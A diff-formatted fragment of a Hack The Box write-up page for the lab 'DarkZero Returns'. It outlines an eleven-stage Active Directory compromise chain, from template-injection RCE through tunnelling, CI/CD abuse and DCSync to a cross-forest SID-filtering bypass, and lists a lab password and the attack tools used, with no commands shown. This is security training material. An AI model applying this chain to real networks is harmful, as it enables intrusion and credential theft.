href="#sec-10-sid-filtering-bypass">SID-filtering bypass</a></li><li class="toc-h3"><a href="#sec-11-forging-the-cross-realm-ticket">Forging the cross-realm ticket</a></li><li><a href="#sec-12-reading-root-txt-with-backup-semantics">Reading root.txt with backup semantics</a></li><li><a href="#sec-13-lessons-learned">Lessons Learned</a></li><li><a href="#sec-14-lessons-learned">Lessons Learned</a></li></ul>
             </div>
-            <div class="pv-body post-content" id="pvBody"><iframe class="pv-custom-frame" title="DarkZero Returns Writeup" srcdoc="&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-&lt;meta charset=&quot;UTF-8&quot;&gt;
-&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-&lt;title&gt;DarkZero Returns — Dual-Forest Active Directory Compromise&lt;/title&gt;
-&lt;style&gt;
-@import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=IBM+Plex+Sans:wght@400;500;600;700&amp;family=IBM+Plex+Mono:wght@400;500;600&amp;display=swap');
+            <div class="pv-body post-content" id="pvBody"><p>josh@SRV01: ~<br>      <br>    <br>    <br>Hack The Box · Write-up</p>
+<h1>DarkZero Returns</h1>
+Dual-Forest Active Directory Compromise
+<p>Unauthenticated Node.js campaign manager to Domain Admin on two trusted Active Directory forests — an eleven-stage chain from AST injection to a raw SMB2 backup-intent read.</p>
+<p>Platform: <strong>Hack The Box</strong><br>      Difficulty: <strong>Hard</strong><br>      OS: <strong>Windows (Linux foothold)</strong><br>      Date: <strong>26 Jul 2026</strong><br>      Author: <strong>Amine Ziani</strong><br>    <br>  <br>  Scroll</p>
+<p>screenshot<br>      <br>        −<br>        +<br>        ×</p>
+<p>Attack Chain / 11 Stages<br>    <br>      <br>      01<br>      <br>        <strong>Recon</strong><br>        <em>virtual host discovery, dzcampaigns.htb</em></p>
+<p>02<br>      <br>        <strong>Initial access</strong><br>        <em>Handlebars AST injection (CVE-2026-58443) → RCE as darkzero</em></p>
+<p>03<br>      <br>        <strong>Credential access</strong><br>        <em>MySQL bcrypt hash cracked with hashcat, reused on domain account josh</em></p>
+<p>04<br>      <br>        <strong>Pivoting</strong><br>        <em>Chisel reverse tunnel into the DNS-less 172.16.20.0/24 segment</em></p>
+<p>05<br>      <br>        <strong>Lateral movement</strong><br>        <em>Kerberos/SPNEGO auth to an internal Gitea instance</em></p>
+<p>06<br>      <br>        <strong>CI/CD privesc — round 1</strong><br>        <em>reversed pull-request workflow trigger → shell as svc-runner</em></p>
+<p>07<br>      <br>        <strong>CI/CD privesc — round 2</strong><br>        <em>Windows path-normalization + git clean-filter RCE (CVE-2026-22547) → shell as svc-gitea</em></p>
+<p>08<br>      <br>        <strong>Local privesc</strong><br>        <em>GodPotato (SeImpersonatePrivilege) → NT AUTHORITY\SYSTEM</em></p>
+<p>09<br>      <br>        <strong>Domain compromise</strong><br>        <em>DCSync of darkzero.ext, blocked at the forest-trust boundary</em></p>
+<p>10<br>      <br>        <strong>Cross-forest attack</strong><br>        <em>SID-filtering bypass via a high-RID group nested in Backup Operators</em></p>
+<p>11<br>      <br>        <strong>Objective</strong><br>        <em>raw SMB2 read with FILE_OPEN_FOR_BACKUP_INTENT → root.txt on DC01.darkzero.htb</em></p>
 
-:root{
-  --void:#0a0d0b;
-  --panel:#111613;
-  --panel-raised:#161d19;
-  --hairline:#213028;
-  --hairline-soft:#182620;
-  --fg:#dbe8e0;
-  --fg-dim:#87998f;
-  --fg-faint:#556960;
-  --phosphor:#4fe3a1;
-  --phosphor-dim:#2b7a58;
-  --amber:#e8a33d;
-  --crimson:#e2585a;
-  --violet:#9d8cff;
-  --font-display:'Space Mono', monospace;
-  --font-body:'IBM Plex Sans', sans-serif;
-  --font-mono:'IBM Plex Mono', monospace;
-}
+<h2 id="sec-0-document-overview">Document Overview</h2>
+<p>TL;DR<br>          <br>Unauthenticated Node.js campaign manager to Domain Admin on two trusted Active Directory forests. The chain runs through a Handlebars AST-injection RCE, a cracked database hash reused on a domain account, a Chisel reverse-tunnel pivot into a DNS-less internal segment, a CI/CD trust-confusion bug in Gitea (twice, via two different primitives), a local privilege escalation with GodPotato, a DCSync blocked at the forest-trust boundary, and finally a SID-filtering bypass across a TREAT_AS_EXTERNAL forest trust to read root.txt off the second forest's domain controller using raw SMB2 backup semantics.</p>
+<p>Tools Used<br>            <br>nmap, Handlebars (manual AST crafting), hashcat, ssh, Chisel, proxychains4, faketime, curl (SPNEGO), Gitea Actions, impacket (ticketer, lookupsid, secretsdump, smbconnection), BloodHound, NetExec (nxc), GodPotato.</p>
+<p>Credential Note<br>            <br>Every credential-bearing screenshot in this write-up — hashcat, secretsdump, lookupsid (x2), and nxc smb/ldap — confirms josh's working password as Rangers1. ISP1337Hackers does not appear anywhere in the evidence; it is most likely the password used to self-register on the campaign-manager app in Stage 1, not josh's domain credential. Rangers1 is used throughout.</p>
+<ul><li>01<strong>Recon</strong> — virtual host discovery, dzcampaigns.htb</li>
+<li>02<strong>Initial access</strong> — Handlebars AST injection (CVE-2026-58443) → RCE as darkzero</li>
+<li>03<strong>Credential access</strong> — MySQL bcrypt hash cracked with hashcat, reused on domain account josh</li>
+<li>04<strong>Pivoting</strong> — Chisel reverse tunnel into the DNS-less 172.16.20.0/24 segment</li>
+<li>05<strong>Lateral movement</strong> — Kerberos/SPNEGO auth to an internal Gitea instance</li>
+<li>06<strong>CI/CD privesc — round 1</strong> — reversed pull-request workflow trigger → shell as svc-runner</li>
+<li>07<strong>CI/CD privesc — round 2</strong> — Windows path-normalization + git clean-filter RCE (CVE-2026-22547) → shell as svc-gitea</li>
+<li>08<strong>Local privesc</strong> — GodPotato (SeImpersonatePrivilege) → NT AUTHORITY\SYSTEM</li>
+<li>09<strong>Domain compromise</strong> — DCSync of darkzero.ext, blocked at the forest-trust boundary</li>
+<li>10<strong>Cross-forest attack</strong> — SID-filtering bypass via a high-RID group nested in Backup Operators</li>
+<li>11<strong>Objective</strong> — raw SMB2 read with FILE_OPEN_FOR_BACKUP_INTENT → root.txt on DC01.darkzero.htb</li></ul>
 
-*{box-sizing:border-box;}
-html{scroll-behavior:smooth;}
-body{
-  margin:0;
-  background:var(--void);
-  color:var(--fg);
-  font-family:var(--font-body);
-  line-height:1.65;
-  -webkit-font-smoothing:antialiased;
-}
-@media (prefers-reduced-motion: reduce){
-  html{scroll-behavior:auto;}
-  *{animation-duration:0.001ms !important; animation-iteration-count:1 !important; transition-duration:0.001ms !important;}
-}
-
-::selection{background:var(--phosphor); color:#04140c;}
-
-a{color:var(--phosphor);}
-
-/* scanline atmosphere, very subtle */
-body::before{
-  content:&quot;&quot;;
-  position:fixed; inset:0; pointer-events:none; z-index:2;
-  background:repeating-linear-gradient(to bottom, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 3px);
-  mix-blend-mode:overlay;
-  opacity:.5;
-}
-
-/* ---------------- HERO ---------------- */
-.hero{
-  position:relative;
-  min-height:100vh;
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  padding:8vh 6vw 10vh;
-  overflow:hidden;
-  border-bottom:1px solid var(--hairline);
-  background:
-    radial-gradient(ellipse 80% 60% at 20% 0%, rgba(79,227,161,0.10), transparent 60%),
-    radial-gradient(ellipse 60% 50% at 100% 100%, rgba(157,140,255,0.06), transparent 60%),
-    var(--void);
-}
-.hero-grid{
-  position:absolute; inset:0; z-index:0;
-  background-image:
-    linear-gradient(rgba(79,227,161,0.05) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(79,227,161,0.05) 1px, transparent 1px);
-  background-size:42px 42px;
-  mask-image:radial-gradient(ellipse 70% 60% at 30% 20%, black, transparent 75%);
-  opacity:.6;
-}
-.hero-inner{position:relative; z-index:1; max-width:920px;}
-.term-window{
-  border:1px solid var(--hairline);
-  background:rgba(17,22,19,0.75);
-  backdrop-filter:blur(6px);
-  border-radius:8px;
-  box-shadow:0 30px 80px -30px rgba(0,0,0,0.7);
-  overflow:hidden;
-  margin-bottom:2.6rem;
-}
-.term-bar{
-  display:flex; align-items:center; gap:.4rem;
-  padding:.55rem .8rem;
-  background:var(--panel-raised);
-  border-bottom:1px solid var(--hairline);
-  font-family:var(--font-mono);
-  font-size:.72rem;
-  color:var(--fg-faint);
-}
-.term-bar span.dot{width:9px; height:9px; border-radius:50%; display:inline-block; background:var(--fg-faint); opacity:.5;}
-.term-bar span.dot:nth-child(1){background:var(--crimson); opacity:.85;}
-.term-bar span.dot:nth-child(2){background:var(--amber); opacity:.85;}
-.term-bar span.dot:nth-child(3){background:var(--phosphor); opacity:.85;}
-.term-bar .path{margin-left:.6rem; letter-spacing:.02em;}
-.term-body{padding:1.1rem 1.3rem 1.4rem; font-family:var(--font-mono); font-size:.86rem; color:var(--fg-dim);}
-.term-body .line{white-space:pre-wrap; word-break:break-word;}
-.term-body .prompt{color:var(--phosphor);}
-.term-body .caret{display:inline-block; width:8px; height:1.1em; background:var(--phosphor); vertical-align:text-bottom; margin-left:2px; animation:blink 1s steps(1) infinite;}
-@keyframes blink{50%{opacity:0;}}
-
-.eyebrow{
-  font-family:var(--font-mono);
-  font-size:.78rem;
-  letter-spacing:.14em;
-  text-transform:uppercase;
-  color:var(--amber);
-  margin:0 0 1rem;
-}
-h1.title{
-  font-family:var(--font-display);
-  font-weight:700;
-  font-size:clamp(2.1rem, 5.4vw, 4.2rem);
-  line-height:1.05;
-  letter-spacing:-0.01em;
-  margin:0 0 1.4rem;
-  color:var(--fg);
-}
-h1.title .accent{color:var(--phosphor);}
-.hero-sub{
-  font-size:1.08rem;
-  color:var(--fg-dim);
-  max-width:62ch;
-  margin:0 0 2.2rem;
-}
-.meta-row{
-  display:flex; flex-wrap:wrap; gap:.5rem 1rem;
-  font-family:var(--font-mono);
-  font-size:.82rem;
-  color:var(--fg-dim);
-}
-.meta-row .chip{
-  border:1px solid var(--hairline);
-  padding:.32rem .7rem;
-  border-radius:999px;
-  background:var(--panel);
-  white-space:nowrap;
-}
-.meta-row .chip b{color:var(--fg);}
-.meta-row .chip.warn{border-color:rgba(232,163,61,0.4); color:var(--amber);}
-.meta-row .chip.danger{border-color:rgba(226,88,90,0.4); color:var(--crimson);}
-
-.scrolldown{
-  position:absolute; bottom:2.4rem; left:6vw;
-  font-family:var(--font-mono); font-size:.72rem; color:var(--fg-faint);
-  display:flex; align-items:center; gap:.6rem;
-  letter-spacing:.1em; text-transform:uppercase;
-}
-.scrolldown .bar{width:1px; height:34px; background:linear-gradient(to bottom, var(--phosphor), transparent); animation:pulse-bar 1.8s ease-in-out infinite;}
-@keyframes pulse-bar{0%,100%{opacity:.3;} 50%{opacity:1;}}
-
-/* ---------------- LAYOUT ---------------- */
-.layout{
-  display:grid;
-  grid-template-columns:280px 1fr;
-  gap:0;
-  max-width:1320px;
-  margin:0 auto;
-  align-items:start;
-}
-.rail-col{
-  position:sticky; top:0;
-  align-self:start;
-  height:100vh;
-  overflow-y:auto;
-  padding:3.4rem 1.4rem 3rem 6vw;
-  border-right:1px solid var(--hairline);
-  scrollbar-width:thin;
-  scrollbar-color:var(--hairline) transparent;
-}
-.rail-col::-webkit-scrollbar{width:6px;}
-.rail-col::-webkit-scrollbar-thumb{background:var(--hairline); border-radius:3px;}
-
-.rail-title{
-  font-family:var(--font-mono); font-size:.7rem; letter-spacing:.14em;
-  text-transform:uppercase; color:var(--fg-faint); margin-bottom:1.1rem;
-}
-.rail-line{
-  position:relative;
-  padding-left:0;
-}
-.rail-node{
-  position:relative;
-  display:flex; align-items:flex-start; gap:.85rem;
-  padding:.55rem 0;
-  cursor:pointer;
-  outline:none;
-}
-.rail-node::before{
-  content:&quot;&quot;;
-  position:absolute; left:12px; top:2.3rem; bottom:-0.2rem;
-  width:1px; background:var(--hairline-soft);
-}
-.rail-node:last-child::before{display:none;}
-.rail-node.active::before{background:var(--phosphor-dim);}
-.rail-dot{
-  position:relative; z-index:1;
-  width:25px; height:25px; border-radius:50%;
-  display:flex; align-items:center; justify-content:center;
-  border:1px solid var(--hairline);
-  background:var(--panel);
-  font-family:var(--font-mono); font-size:.62rem; color:var(--fg-faint);
-  flex:none;
-  transition:all .35s ease;
-}
-.rail-node.active .rail-dot{
-  border-color:var(--phosphor);
-  color:var(--void);
-  background:var(--phosphor);
-  box-shadow:0 0 0 4px rgba(79,227,161,0.14), 0 0 18px rgba(79,227,161,0.5);
-}
-.rail-node.passed .rail-dot{border-color:var(--phosphor-dim); color:var(--phosphor-dim); background:transparent;}
-.rail-label{display:flex; flex-direction:column; gap:.15rem; padding-top:.15rem;}
-.rail-label b{font-size:.82rem; color:var(--fg-dim); font-weight:600; transition:color .3s ease;}
-.rail-node.active .rail-label b{color:var(--fg);}
-.rail-label em{font-style:normal; font-size:.72rem; color:var(--fg-faint); line-height:1.35;}
-.rail-node:hover .rail-label b{color:var(--phosphor);}
-
-.main-col{padding:0 6vw 6rem 4.5rem;}
-
-/* ---------------- OVERVIEW BLOCK ---------------- */
-.overview{padding:4.5rem 0 3.5rem; border-bottom:1px solid var(--hairline);}
-.overview h2.block-title, .stage-head h2, .lessons h2.block-title{
-  font-family:var(--font-display); font-weight:700;
-  font-size:1.05rem; text-transform:uppercase; letter-spacing:.06em;
-  color:var(--fg);
-}
-.overview-grid{display:grid; grid-template-columns:1.4fr 1fr; gap:2.4rem; margin-top:1.6rem;}
-@media (max-width:900px){.overview-grid{grid-template-columns:1fr;}}
-.tldr-card{
-  border:1px solid var(--hairline); background:var(--panel);
-  border-radius:10px; padding:1.6rem 1.7rem;
-}
-.tldr-card p{margin:0; color:var(--fg-dim); font-size:1rem;}
-.tldr-card .label{font-family:var(--font-mono); font-size:.7rem; letter-spacing:.12em; color:var(--phosphor); text-transform:uppercase; margin-bottom:.7rem; display:block;}
-
-.side-cards{display:flex; flex-direction:column; gap:1.2rem;}
-.mini-card{border:1px solid var(--hairline); background:var(--panel); border-radius:10px; padding:1.2rem 1.4rem;}
-.mini-card .label{font-family:var(--font-mono); font-size:.7rem; letter-spacing:.1em; text-transform:uppercase; color:var(--fg-faint); margin-bottom:.5rem; display:block;}
-.mini-card p{margin:0; font-size:.88rem; color:var(--fg-dim);}
-.mini-card.credential{border-color:rgba(226,88,90,0.35);}
-.mini-card.credential .label{color:var(--crimson);}
-.mini-card.credential code{color:var(--crimson);}
-
-.chain-list{list-style:none; margin:2.2rem 0 0; padding:0; display:flex; flex-direction:column; gap:.9rem;}
-.chain-list li{display:flex; gap:1rem; align-items:baseline; font-size:.92rem; color:var(--fg-dim); border-bottom:1px dashed var(--hairline-soft); padding-bottom:.9rem;}
-.chain-list li:last-child{border-bottom:none;}
-.chain-idx{font-family:var(--font-mono); color:var(--phosphor); font-size:.82rem; flex:none; width:1.6rem;}
-.chain-list li b{color:var(--fg);}
-
-/* ---------------- STAGES ---------------- */
-.stage{padding:4rem 0; border-bottom:1px solid var(--hairline); opacity:0; transform:translateY(18px); transition:opacity .7s ease, transform .7s ease;}
-.stage.in-view{opacity:1; transform:translateY(0);}
-.stage:last-of-type{border-bottom:none;}
-.stage-head{display:flex; align-items:baseline; gap:1.1rem; margin-bottom:1.6rem;}
-.stage-num{
-  font-family:var(--font-display); font-weight:700; font-size:1.05rem; color:var(--void);
-  background:var(--phosphor); width:2.6rem; height:2.6rem; border-radius:6px;
-  display:flex; align-items:center; justify-content:center; flex:none;
-}
-.stage-head h2{margin:0; font-size:1.4rem;}
-.stage-body p{color:var(--fg-dim); font-size:1rem; max-width:74ch;}
-.stage-body h3{font-family:var(--font-mono); font-size:.9rem; letter-spacing:.04em; color:var(--amber); text-transform:uppercase; margin:2.2rem 0 1rem;}
-.stage-body code{
-  font-family:var(--font-mono); background:var(--panel-raised); border:1px solid var(--hairline-soft);
-  padding:.1rem .4rem; border-radius:4px; font-size:.86em; color:var(--phosphor);
-}
-
-pre.term{
-  font-family:var(--font-mono); font-size:.82rem; line-height:1.6;
-  background:var(--panel); border:1px solid var(--hairline); border-radius:8px;
-  padding:1.2rem 1.4rem; overflow-x:auto; color:#b9d6c6; margin:1.4rem 0;
-  position:relative;
-}
-pre.term::before{
-  content:&quot;$&quot;; position:absolute; left:-1px; top:-1px; font-family:var(--font-mono);
-  font-size:.65rem; color:var(--void); background:var(--phosphor-dim);
-  padding:.15rem .5rem; border-radius:6px 0 8px 0;
-}
-pre.term code{background:none; border:none; padding:0; color:inherit; font-size:1em;}
-
-/* screenshot frame */
-figure.shot{margin:1.6rem 0; break-inside:avoid; max-width:420px;}
-.shot-frame{
-  border:1px solid var(--hairline); border-radius:8px; overflow:hidden;
-  background:var(--panel);
-  box-shadow:0 20px 50px -25px rgba(0,0,0,.65);
-  transition:transform .3s ease, box-shadow .3s ease;
-}
-.shot-frame:hover{transform:scale(1.03); box-shadow:0 24px 60px -20px rgba(0,0,0,.8);}
-.shot-bar{
-  display:flex; align-items:center; gap:.4rem; padding:.5rem .7rem;
-  background:var(--panel-raised); border-bottom:1px solid var(--hairline);
-}
-.shot-bar span{width:8px; height:8px; border-radius:50%; background:var(--fg-faint); opacity:.4;}
-.shot-bar span:nth-child(1){background:var(--crimson); opacity:.7;}
-.shot-bar span:nth-child(2){background:var(--amber); opacity:.7;}
-.shot-bar span:nth-child(3){background:var(--phosphor); opacity:.7;}
-.shot-path{
-  margin-left:.5rem; font-family:var(--font-mono); font-size:.68rem; color:var(--fg-faint);
-  overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
-}
-.shot-frame img{display:block; width:100%; height:auto; max-height:260px; object-fit:cover; object-position:top; cursor:zoom-in;}
-.shot-frame{position:relative;}
-.shot-frame::after{
-  content:&quot;⤢&quot;; position:absolute; right:.55rem; bottom:.55rem;
-  width:26px; height:26px; border-radius:50%;
-  background:rgba(10,13,11,0.72); border:1px solid var(--hairline);
-  color:var(--phosphor); font-size:.85rem; line-height:1;
-  display:flex; align-items:center; justify-content:center;
-  opacity:0; transition:opacity .25s ease; pointer-events:none;
-}
-.shot-frame:hover::after{opacity:1;}
-
-/* lightbox */
-.lightbox{
-  position:fixed; inset:0; z-index:100;
-  background:rgba(6,9,7,0.92);
-  backdrop-filter:blur(4px);
-  display:flex; align-items:center; justify-content:center;
-  padding:5vh 5vw;
-  opacity:0; visibility:hidden;
-  transition:opacity .25s ease;
-  cursor:zoom-out;
-}
-.lightbox.open{opacity:1; visibility:visible;}
-.lightbox-inner{
-  position:relative;
-  max-width:min(1100px, 90vw); max-height:88vh;
-  border:1px solid var(--hairline); border-radius:10px; overflow:hidden;
-  background:var(--panel);
-  box-shadow:0 40px 100px -30px rgba(0,0,0,.85);
-  transform:scale(.94);
-  transition:transform .25s ease;
-}
-.lightbox.open .lightbox-inner{transform:scale(1);}
-.lightbox-bar{
-  display:flex; align-items:center; justify-content:space-between; gap:.6rem;
-  padding:.55rem .8rem; background:var(--panel-raised); border-bottom:1px solid var(--hairline);
-  font-family:var(--font-mono); font-size:.72rem; color:var(--fg-faint);
-}
-.lightbox-bar .zoom-controls{display:flex; align-items:center; gap:.4rem;}
-.lightbox-bar button{
-  font-family:var(--font-mono); font-size:.85rem; line-height:1; cursor:pointer;
-  width:26px; height:26px; border-radius:6px;
-  border:1px solid var(--hairline); background:var(--panel); color:var(--fg-dim);
-  display:flex; align-items:center; justify-content:center;
-  transition:color .2s ease, border-color .2s ease;
-}
-.lightbox-bar button:hover{color:var(--phosphor); border-color:var(--phosphor-dim);}
-.lightbox-bar .lb-close{color:var(--crimson);}
-.lightbox-bar .lb-close:hover{color:var(--crimson); border-color:var(--crimson);}
-.lightbox-viewport{
-  overflow:auto; max-height:calc(88vh - 40px); max-width:min(1100px, 90vw);
-  display:flex; align-items:flex-start; justify-content:center;
-  background:var(--void);
-}
-.lightbox-viewport img{
-  display:block; max-width:none; height:auto;
-  width:100%;
-  transform-origin:top center;
-  transition:transform .2s ease;
-  cursor:zoom-in;
-}
-.lightbox-viewport img.zoomed{cursor:zoom-out;}
-.lightbox-caption{
-  font-family:var(--font-mono); font-size:.72rem; color:var(--fg-faint);
-}
-figure.shot figcaption{
-  font-family:var(--font-mono); font-size:.76rem; color:var(--fg-faint);
-  margin-top:.6rem; padding-left:.1rem;
-}
-
-/* ---------------- LESSONS / FOOTER ---------------- */
-.lessons{padding:4rem 0 2rem;}
-.lessons ul{list-style:none; margin:1.8rem 0 0; padding:0; display:flex; flex-direction:column; gap:1rem;}
-.lessons li{
-  display:flex; gap:1rem; font-size:.98rem; color:var(--fg-dim);
-  border-left:2px solid var(--phosphor-dim); padding:.2rem 0 .2rem 1.1rem;
-}
-footer.sig{
-  padding:3rem 0 5rem; text-align:left; font-family:var(--font-mono);
-  font-size:.82rem; color:var(--fg-faint); border-top:1px solid var(--hairline); margin-top:1rem;
-}
-footer.sig .flag{color:var(--phosphor);}
-
-/* progress bar top */
-.progress-top{position:fixed; top:0; left:0; height:2px; background:var(--phosphor); z-index:50; width:0%; box-shadow:0 0 10px var(--phosphor);}
-
-/* mobile */
-@media (max-width:980px){
-  .layout{grid-template-columns:1fr;}
-  .rail-col{
-    position:sticky; top:0; height:auto; max-height:none;
-    padding:1rem 6vw; border-right:none; border-bottom:1px solid var(--hairline);
-    background:rgba(10,13,11,0.92); backdrop-filter:blur(8px); z-index:20;
-  }
-  .rail-title{display:none;}
-  .rail-line{display:flex; gap:1.1rem; overflow-x:auto; padding-bottom:.2rem;}
-  .rail-node::before{display:none;}
-  .rail-label{display:none;}
-  .rail-node{padding:.3rem 0;}
-  .main-col{padding:0 6vw 5rem;}
-  .hero{padding:6vh 6vw 8vh;}
-}
-&lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-
-&lt;div class=&quot;progress-top&quot; id=&quot;progressTop&quot;&gt;&lt;/div&gt;
-
-&lt;header class=&quot;hero&quot;&gt;
-  &lt;div class=&quot;hero-grid&quot;&gt;&lt;/div&gt;
-  &lt;div class=&quot;hero-inner&quot;&gt;
-    &lt;div class=&quot;term-window&quot;&gt;
-      &lt;div class=&quot;term-bar&quot;&gt;&lt;span class=&quot;dot&quot;&gt;&lt;/span&gt;&lt;span class=&quot;dot&quot;&gt;&lt;/span&gt;&lt;span class=&quot;dot&quot;&gt;&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;josh@SRV01: ~&lt;/span&gt;&lt;/div&gt;
-      &lt;div class=&quot;term-body&quot; id=&quot;bootTerm&quot;&gt;&lt;/div&gt;
-    &lt;/div&gt;
-    &lt;p class=&quot;eyebrow&quot;&gt;Hack The Box &amp;middot; Write-up&lt;/p&gt;
-    &lt;h1 class=&quot;title&quot;&gt;DarkZero Returns&lt;br&gt;&lt;span class=&quot;accent&quot;&gt;Dual-Forest Active Directory Compromise&lt;/span&gt;&lt;/h1&gt;
-    &lt;p class=&quot;hero-sub&quot;&gt;Unauthenticated Node.js campaign manager to Domain Admin on two trusted Active Directory forests &amp;mdash; an eleven-stage chain from AST injection to a raw SMB2 backup-intent read.&lt;/p&gt;
-    &lt;div class=&quot;meta-row&quot;&gt;
-      &lt;span class=&quot;chip&quot;&gt;Platform: &lt;b&gt;Hack The Box&lt;/b&gt;&lt;/span&gt;
-      &lt;span class=&quot;chip warn&quot;&gt;Difficulty: &lt;b&gt;Hard&lt;/b&gt;&lt;/span&gt;
-      &lt;span class=&quot;chip&quot;&gt;OS: &lt;b&gt;Windows (Linux foothold)&lt;/b&gt;&lt;/span&gt;
-      &lt;span class=&quot;chip&quot;&gt;Date: &lt;b&gt;26 Jul 2026&lt;/b&gt;&lt;/span&gt;
-      &lt;span class=&quot;chip warn&quot;&gt;Author: &lt;b&gt;Amine Ziani&lt;/b&gt;&lt;/span&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-  &lt;div class=&quot;scrolldown&quot;&gt;&lt;span&gt;Scroll&lt;/span&gt;&lt;span class=&quot;bar&quot;&gt;&lt;/span&gt;&lt;/div&gt;
-&lt;/header&gt;
-
-&lt;div class=&quot;lightbox&quot; id=&quot;lightbox&quot;&gt;
-  &lt;div class=&quot;lightbox-inner&quot;&gt;
-    &lt;div class=&quot;lightbox-bar&quot;&gt;
-      &lt;span class=&quot;lightbox-caption&quot; id=&quot;lightboxCaption&quot;&gt;screenshot&lt;/span&gt;
-      &lt;div class=&quot;zoom-controls&quot;&gt;
-        &lt;button type=&quot;button&quot; id=&quot;lbZoomOut&quot; aria-label=&quot;Zoom out&quot;&gt;&amp;minus;&lt;/button&gt;
-        &lt;button type=&quot;button&quot; id=&quot;lbZoomIn&quot; aria-label=&quot;Zoom in&quot;&gt;&amp;plus;&lt;/button&gt;
-        &lt;button type=&quot;button&quot; class=&quot;lb-close&quot; id=&quot;lbClose&quot; aria-label=&quot;Close&quot;&gt;&amp;times;&lt;/button&gt;
-      &lt;/div&gt;
-    &lt;/div&gt;
-    &lt;div class=&quot;lightbox-viewport&quot; id=&quot;lightboxViewport&quot;&gt;
-      &lt;img id=&quot;lightboxImg&quot; src=&quot;&quot; alt=&quot;&quot;&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;layout&quot;&gt;
-  &lt;nav class=&quot;rail-col&quot; aria-label=&quot;Attack chain progress&quot;&gt;
-    &lt;div class=&quot;rail-title&quot;&gt;Attack Chain / 11 Stages&lt;/div&gt;
-    &lt;div class=&quot;rail-line&quot; id=&quot;railLine&quot;&gt;
-      &lt;div class=&quot;rail-node&quot; data-target=&quot;s1&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 1: Recon&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;01&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Recon&lt;/b&gt;
-        &lt;em&gt;virtual host discovery, dzcampaigns.htb&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s2&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 2: Initial access&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;02&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Initial access&lt;/b&gt;
-        &lt;em&gt;Handlebars AST injection (CVE-2026-58443) → RCE as darkzero&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s3&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 3: Credential access&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;03&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Credential access&lt;/b&gt;
-        &lt;em&gt;MySQL bcrypt hash cracked with hashcat, reused on domain account josh&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s4&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 4: Pivoting&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;04&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Pivoting&lt;/b&gt;
-        &lt;em&gt;Chisel reverse tunnel into the DNS-less 172.16.20.0/24 segment&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s5&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 5: Lateral movement&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;05&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Lateral movement&lt;/b&gt;
-        &lt;em&gt;Kerberos/SPNEGO auth to an internal Gitea instance&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s6&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 6: CI/CD privesc — round 1&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;06&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;CI/CD privesc — round 1&lt;/b&gt;
-        &lt;em&gt;reversed pull-request workflow trigger → shell as svc-runner&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s7&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 7: CI/CD privesc — round 2&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;07&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;CI/CD privesc — round 2&lt;/b&gt;
-        &lt;em&gt;Windows path-normalization + git clean-filter RCE (CVE-2026-22547) → shell as svc-gitea&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s8&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 8: Local privesc&quot;&gt;
